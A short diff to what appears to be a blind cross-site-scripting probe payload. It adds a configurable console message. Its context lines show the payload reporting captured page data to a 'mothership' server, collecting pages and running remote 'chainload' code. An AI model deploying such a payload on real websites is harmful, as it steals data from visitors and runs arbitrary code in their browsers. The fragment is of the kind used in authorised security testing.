@@ -32,6 +32,7 @@ r.forEach(function(e){try{n.style[e]=t.css(e)}catch(r){E("html2canvas: Parse: Ex
 
 var chainload_uri = [CHAINLOAD_REPLACE_ME];
 var collect_page_list = [COLLECT_PAGE_LIST_REPLACE_ME]
+var console_message = [CONSOLE_MESSAGE_REPLACE_ME];
 
 // Source: https://stackoverflow.com/a/20151856/1195812
 function base64_to_blob(base64Data, contentType) {
@@ -264,6 +265,9 @@ function hook_load_if_not_ready() {
 function finishing_moves() {
     contact_mothership( probe_return_data );
     collect_pages();
+    if (console_message != "") {
+        console.log(console_message);
+    }
     if( chainload_uri != "" && chainload_uri != null ) {
         eval_remote_source( chainload_uri );
     }
